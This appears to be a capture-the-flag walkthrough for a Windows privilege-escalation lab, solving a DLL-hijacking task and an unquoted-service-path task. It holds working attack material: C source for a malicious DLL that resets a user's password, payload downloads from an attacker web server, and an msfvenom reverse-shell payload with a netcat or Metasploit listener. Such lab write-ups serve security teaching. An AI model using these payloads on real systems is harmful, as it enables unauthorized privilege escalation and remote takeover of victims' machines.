Task 5 {DLL Hijacking}

Question 1: Login with Jack's account (the new password you have set). What is the content of the flagdll.txt file? 
{{Hint:}}

Open a text editor and create a file with the following code, and name it [whatever].c:

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net user jack Password11");
        ExitProcess(0);
    }
    return TRUE;
}

Using the mingw compiler, generate the dll:
x86_64-w64-mingw32-gcc whatver.c -shared -o hijackme.dll

Start a webserver on your attacker machine:
python3 -m http.server 9000

On the victim PC, let's grab the malicious dll using powershell.
First, navigate to the Temp folder:
cd C:\Temp\

Then, download the dll from our attacker machine:
wget -O hijackme.dll [your machine IP]:[port]/hijackme.dll

Using command prompt, restart the dllsvc service on the victim machine:
sc stop dllsvc
sc start dllsvc

If all goes well, the password for user jack should now be changed to "Password11".

Back to powershell, run the following command:
runas /user:jack cmd.exe
enter the password at the prompt

In the new window:
type C:\Users\jack\Documents\flagdll.txt for flag


Task 6 {Unquoted Service Path}

Question 1: What is the full unquoted path of unquotedsvc?
{{Hint: in command prompt: sc qc unquotedsvc}

Question 2: Which folder does the user have read and write privileges on? (Please write the whole path)?
{{Hint: navigate to the desktop 
cd Desktop
and try each subfolder in the path starting at C:\Program Files\ until you find one that is writable by BUILTIN\Users
.\accesschk64.exe /accepteula -uwdq "C:\path\here\try\them\all

Question 3: What would be the name of the executable you would place in that folder? 
{{Hint: What is the first word of the subfolder that's in the subfolder you have write privileges on?}}

Question 4: Obtain Administrator privileges on the target machine. What is the content of the flagUSP.txt file?
{{Hint}}

Let's generate the payload for our reverse shell:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[your machine IP] LPORT=[port number] -f exe > common.exe

We can use either netcat or metasploit for our listener:
netcat:
nc -lvnp [port you specified earlier]

-OR-

msfconsole
use /exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set lhost [your machine IP]
set lport [port you specified in the payload]
run

Start a server:
python3 -m http.server 9000

Now, head over to the victim PC and open powershell.
Navigate to C:\Program Files\Unquoted Path Service\
cd "C:\Program Files\Unquoted Path Service\" (needs quotes)
wget -O common.exe [yourmachineIP]:[port]/common.exe

Then, in a command prompt:
sc start unquotedsvc
and catch the shell on your machine.

Flag is in: C:\Users\Cora\Documents\
